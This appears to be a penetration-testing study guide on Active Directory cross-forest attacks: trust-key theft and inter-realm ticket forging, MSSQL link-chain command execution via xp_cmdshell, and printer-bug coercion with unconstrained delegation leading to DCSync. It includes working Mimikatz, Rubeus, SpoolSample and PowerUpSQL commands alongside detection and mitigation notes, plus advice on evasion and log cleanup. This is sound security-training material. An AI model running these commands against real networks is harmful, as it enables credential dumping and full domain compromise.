## Cross Forest Attacks

This document covers techniques for attacking across Active Directory forest boundaries. Forests are considered the security boundary in AD, but misconfigurations in trust relationships can allow attackers to pivot between forests.

---

## Core Concepts to Master

### 1. **Active Directory Forest Architecture**
- **Forest Structure:** Understanding multi-domain forests, tree hierarchies, and organizational units
- **Security Boundaries:** Why forests (not domains) are the true security boundary
- **Global Catalog:** Role in cross-forest authentication and resource location
- **Schema and Configuration Partitions:** How they replicate across forests

### 2. **Trust Relationships**
- **Trust Types:** External, forest, shortcut, realm trusts
- **Trust Direction:** One-way vs. bidirectional, inbound vs. outbound
- **Trust Transitivity:** Transitive vs. non-transitive trusts
- **Trust Keys:** How shared secrets authenticate cross-forest requests
- **SID Filtering:** Understanding and bypassing SID filtering mechanisms
- **Selective Authentication:** How it restricts cross-forest access

### 3. **Kerberos Cross-Realm Authentication**
- **Inter-Realm TGTs:** How tickets traverse forest boundaries
- **Referral Process:** How KDC referrals work across trusts
- **Trust Ticket Encryption:** Understanding trust key usage in ticket encryption
- **PAC (Privilege Attribute Certificate):** How authorization data crosses forests
- **SID History in Cross-Forest Context:** When and how it's filtered

### 4. **Delegation Across Boundaries**
- **Unconstrained Delegation:** Caching TGTs across forest boundaries
- **Constrained Delegation:** Cross-forest service delegation limitations
- **Resource-Based Constrained Delegation:** Trust boundary implications
- **Protocol Transition:** S4U2Self and S4U2Proxy in cross-forest scenarios

### 5. **SQL Server Security Architecture**
- **Database Links:** Linked server architecture and authentication context
- **Impersonation Chains:** How authentication context flows through links
- **SQL Server Service Accounts:** Privilege implications
- **RPC and OPENQUERY:** Remote procedure execution mechanisms
- **xp_cmdshell:** OS command execution from SQL context

### 6. **Authentication Coercion Techniques**
- **Printer Bug (SpoolSample):** Forcing remote authentication
- **PetitPotam:** NTLM relay via MS-EFSRPC
- **Coercion Methods:** Various RPC calls that trigger authentication
- **WebDAV and SMB Coercion:** Forcing authentication over different protocols

---

**Understanding Forest Trusts:**
- **Forest:** Top-level AD container; the ultimate security boundary
- **Trust Types:** 
  - **One-way:** Forest A trusts Forest B (users from B can access resources in A)
  - **Two-way/Bidirectional:** Mutual trust (users from both forests can access each other's resources)
- **Trust Direction:** Determines authentication flow
- **SID Filtering:** Security feature that prevents SID History abuse across forest trusts (usually enabled for external trusts, disabled within same forest)

### Trust Tickets

**What are Trust Tickets (Inter-Realm TGTs)?** 
When forests have trust relationships, a special "trust key" is shared between them. With Domain Admin access in one forest, you can extract this trust key and forge inter-realm TGT tickets to access resources in the trusted forest.

**How it works:**
1. Compromise Domain Admin in Forest A (which has trust with Forest B)
2. Extract the trust key (shared secret between forests) from a DC
3. Forge an inter-realm TGT (similar to Golden Ticket, but for cross-forest)
4. Use this TGT to request TGS tickets for services in Forest B
5. Access resources in the trusted forest

**Trust key details:**
- Stored on DCs that maintain the trust relationship
- Used to encrypt inter-realm TGTs
- Rarely changed (similar to krbtgt)
- Separate from each forest's krbtgt key

**Attack flow:**
```
[Forest A - Compromised] --Trust Key--> [Forge Inter-Realm TGT] --Request TGS--> [Forest B Resources]
```

**Requirements:** 
- Domain Admin in the source forest
- Bidirectional trust relationship (or one-way where your forest is trusted)
- Trust key between forests

**Limitations:**
- Access is limited by what permissions your account/group has in target forest
- SID Filtering (if enabled) prevents some privilege escalation techniques
- Group memberships don't automatically transfer across forests
- Target forest's access controls still apply

**Detection:**
- Unusual cross-forest authentication patterns
- TGTs with SID history from external forest
- Monitor trust key access on DCs
- Anomalous inter-realm ticket requests

_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._

:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!

- Using Mimikatz:

  ```powershell
  #Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  #Forge an inter-realm TGT using the Golden Ticket attack
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
  <PathToSaveTheGoldenTicket>"'
  ```

  :exclamation: Tickets -> .kirbi format

  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

- Using Rubeus:

  ```powershell
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
  ```

### Abuse MSSQL Servers

**What is MSSQL Server Abuse?** 
SQL Server instances often run with high privileges (service accounts, sometimes even as SYSTEM) and may be configured with database links that allow query execution across multiple servers, including servers in different forests. These links can be chained to execute commands in trusted domains/forests.

**Why MSSQL is valuable:**
- Often runs as privileged service accounts (LocalSystem, Domain Admin service accounts)
- Database links can span across domains and forests
- Links work across forest trust boundaries
- `xp_cmdshell` allows OS command execution
- Administrators often configure excessive trust between SQL servers

**Database Links explained:**
- Allow one SQL Server to query/execute on another SQL Server
- Can be chained: SQL1 → SQL2 → SQL3 → SQL4 (even across forests)
- Authentication context is passed through the link
- Often configured with elevated privileges

**Attack chain example:**
```
[User on SQL1] → [Link to SQL2] → [Link to SQL3 in different domain] → [Link to SQL4 in different forest] → [xp_cmdshell execution]
```

**Requirements:** 
- Access to initial SQL Server (as low-privilege database user)
- Database links configured between servers
- xp_cmdshell enabled (or ability to enable it)
- RPC Out enabled on linked servers (or ability to enable it)

**Common privilege escalation:**
1. Access SQL server as domain user
2. Enumerate database links
3. Find links to servers in other domains/forests
4. Execute commands through link chain
5. Compromise service account or execute as SYSTEM

**Detection:**
- Monitor database link configuration changes
- Track unusual cross-server query patterns
- Alert on xp_cmdshell enablement
- Monitor sp_serveroption changes (RPC Out)
- Log command execution via xp_cmdshell

- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
- Check Accessibility as current user:

  ```powershell
  Get-SQLConnectionTestThreaded
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  ```

- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abusing SQL Database Links: 

**What are Database Links?** 
A database link allows a SQL Server to access and execute queries on other SQL Servers. If we have two linked SQL Servers, we can execute stored procedures on both. Database links work across forest trusts, making them a powerful cross-forest attack vector.

**How link chains work:**
- Each link passes authentication context to the next server
- Can use `OPENQUERY` to execute queries on linked servers
- Can enable features (like xp_cmdshell) remotely through links
- Links can be nested/chained across multiple servers

**Why this is dangerous:**
- Privilege escalation through link chains
- Lateral movement across domains/forests
- SQL service accounts often have high privileges
- Links bypass normal authentication boundaries
- Administrators forget about link configurations

_WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_

Check for existing Database Links:

```powershell
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```powershell
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

# Enable RPC Out (Required to Execute XP_CMDSHELL)
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

**What is Breaking Forest Trusts?** 
A sophisticated attack that combines unconstrained delegation with printer bug coercion to compromise a trusted forest. If you control a machine with unconstrained delegation in Forest A and there's a bidirectional trust with Forest B, you can force Forest B's Domain Controller to authenticate to your machine, capture its TGT, and use it to compromise the entire Forest B.

**How the attack works:**

1. **Setup:** You've compromised Forest A and found a machine with unconstrained delegation (DCs have this by default)
2. **Coercion:** Use PrinterBug/SpoolSample to force Forest B's DC to authenticate to your controlled machine
3. **Capture:** The Forest B DC's TGT is sent and cached on your unconstrained delegation machine
4. **Extraction:** Monitor and extract the DC's TGT from memory
5. **Impersonation:** Inject the captured TGT into your session
6. **DCSync:** You're now the Forest B DC; perform DCSync to dump all credentials
7. **Result:** Complete compromise of Forest B from Forest A

**Why this works:**
- **Unconstrained Delegation:** Any TGT sent to these machines is cached
- **Printer Bug:** Forces authentication from target DC to attacker machine
- **Cross-Forest Trust:** DC authentication works across trust boundaries
- **No SID Filtering on forest DCs:** DC machine accounts cross forest trusts

**Attack flow:**
```
[Compromised Forest A] → [Machine with Unconstrained Delegation] 
         ↓
[PrinterBug forces Forest B DC to authenticate]
         ↓
[Capture Forest B DC's TGT]
         ↓
[Pass-the-Ticket + DCSync] → [Full Forest B Compromise]
```

**Requirements:** 
- Compromise in Forest A with bidirectional trust to Forest B
- Access to machine with unconstrained delegation (or compromise a DC)
- Network connectivity to target forest's DC
- Printer Spooler service running on target DC (default)

**Why this is significant:**
- **Security Boundary Myth:** Forests are supposed to be security boundaries
- **Trust = Compromise Path:** Bidirectional trust creates attack surface
- **Default Configuration:** DCs have unconstrained delegation by default
- **Difficult to prevent:** Requires disabling printer spooler or removing trusts

**Detection:**
- Monitor for PrinterBug/SpoolSample execution
- Alert on cross-forest authentication from DCs
- Track TGT requests for DC machine accounts
- Monitor machines with unconstrained delegation
- Event ID 4624 (Logon) from foreign forest DCs
- DCSync attempts from unusual sources

**Mitigations:**
- Disable Print Spooler on DCs
- Remove unnecessary forest trusts
- Use one-way trusts where possible
- Monitor unconstrained delegation usage
- Implement Protected Users group for admin accounts

_WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._

Tools we are going to use:

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:

```powershell
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```

Detailed Articles:

- [Not A Security Boundary: Breaking Forest Trusts](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

## Skills to Develop

### Technical Skills

#### 1. **Network Protocol Analysis**
- **Wireshark/tcpdump:** Capture and analyze Kerberos, LDAP, SMB traffic
- **Understanding packet structures:** TGT, TGS, AP-REQ/AP-REP messages
- **Cross-forest traffic patterns:** Identifying authentication flows
- **Encrypted vs. plaintext components:** What can be observed on the wire

#### 2. **Active Directory Enumeration**
- **PowerView mastery:** Advanced domain/forest enumeration techniques
- **BloodHound analysis:** Visualizing cross-forest attack paths
- **LDAP querying:** Manual enumeration of trust relationships and configuration
- **Trust relationship mapping:** Building comprehensive forest topology maps
- **Finding delegation configurations:** Identifying unconstrained/constrained delegation

#### 3. **Kerberos Ticket Manipulation**
- **Mimikatz proficiency:** Ticket extraction, injection, and forging
- **Rubeus expertise:** Advanced Kerberos attacks and ticket operations
- **Impacket tools:** Remote Kerberos operations (getTGT.py, getST.py)
- **Ticket analysis:** Understanding ticket structure and modifications
- **Golden/Silver Ticket variations:** Inter-realm ticket forging

#### 4. **SQL Server Exploitation**
- **PowerUpSQL:** SQL Server discovery and exploitation framework
- **Link crawling:** Automated enumeration of database link chains
- **Privilege escalation:** From SQL user to SYSTEM
- **Query injection:** Exploiting database links with SQL injection
- **xp_cmdshell techniques:** Command execution and payload delivery

#### 5. **Credential Harvesting**
- **NTLM relay attacks:** Capturing and relaying authentication
- **Responder/Inveigh:** Network poisoning across subnets
- **DCSync operations:** Remote credential dumping
- **LSASS dumping:** Memory extraction techniques
- **Kerberoasting across forests:** Targeting service accounts in trusted forests

#### 6. **Post-Exploitation Techniques**
- **Lateral movement:** Moving between forests via trust relationships
- **Persistence mechanisms:** Maintaining access across forest boundaries
- **Privilege escalation chains:** Combining multiple vulnerabilities
- **Stealth and OPSEC:** Avoiding detection in cross-forest operations

### Analytical Skills

#### 1. **Trust Relationship Analysis**
- Identifying exploitable trust configurations
- Understanding trust path vulnerabilities
- Evaluating SID filtering effectiveness
- Recognizing privilege inheritance patterns

#### 2. **Attack Path Identification**
- Building attack graphs across forests
- Identifying pivot points and choke points
- Evaluating multi-hop attack feasibility
- Prioritizing targets based on access value

#### 3. **Risk Assessment**
- Evaluating forest trust security posture
- Identifying high-value targets in trusted forests
- Understanding blast radius of compromise
- Assessing detection likelihood

#### 4. **Defensive Thinking**
- Understanding detection mechanisms
- Identifying logging gaps
- Evaluating effectiveness of security controls
- Recommending mitigation strategies

### Operational Skills

#### 1. **Reconnaissance & Planning**
- Systematic forest enumeration
- Trust relationship discovery
- Building comprehensive network maps
- Identifying attack vectors

#### 2. **Tool Chain Mastery**
- PowerShell offensive frameworks
- Python-based exploitation tools
- C# compiled utilities (Rubeus, SharpView)
- Linux-based attack tools (Impacket suite)

#### 3. **Stealth & Evasion**
- Minimizing detection footprint
- Understanding EDR/AV evasion
- Log manipulation and cleanup
- Timing attacks to blend with normal traffic

#### 4. **Documentation & Reporting**
- Recording attack paths and evidence
- Creating reproducible exploitation procedures
- Documenting findings for remediation
- Visualizing complex attack chains

---

## Learning Path Recommendations

### Beginner Level
1. Master basic AD concepts and single-domain enumeration
2. Understand Kerberos authentication fundamentals
3. Learn PowerView and BloodHound basics
4. Practice trust enumeration in lab environments

### Intermediate Level
1. Study cross-domain attacks within a single forest
2. Learn Kerberos ticket manipulation (Golden/Silver tickets)
3. Practice SQL Server link exploitation
4. Understand delegation types and abuse

### Advanced Level
1. Master cross-forest trust attacks
2. Develop custom tools and exploits
3. Learn advanced OPSEC and evasion techniques
4. Practice complex multi-hop attack chains
5. Contribute to offensive security research

### Expert Level
1. Discover and exploit novel attack vectors
2. Develop advanced persistence mechanisms
3. Teach and mentor others
4. Publish research and tools
5. Contribute to defensive strategies

---

## Recommended Lab Practice

### Lab Setup Requirements
- **Multi-forest AD environment:** Minimum 2 forests with bidirectional trust
- **SQL Server instances:** With database links across forests
- **Monitoring tools:** SIEM, EDR to practice detection evasion
- **Snapshot capability:** Quick rollback for iterative testing

### Practice Scenarios
1. **Trust Ticket Forging:** Extract trust key and forge inter-realm TGT
2. **SQL Link Traversal:** Chain through 3+ SQL servers across forests
3. **Breaking Forest Trusts:** Full printer bug + unconstrained delegation attack
4. **DCSync across trusts:** Grant and abuse replication permissions
5. **Stealth operations:** Complete forest compromise with minimal detection

---
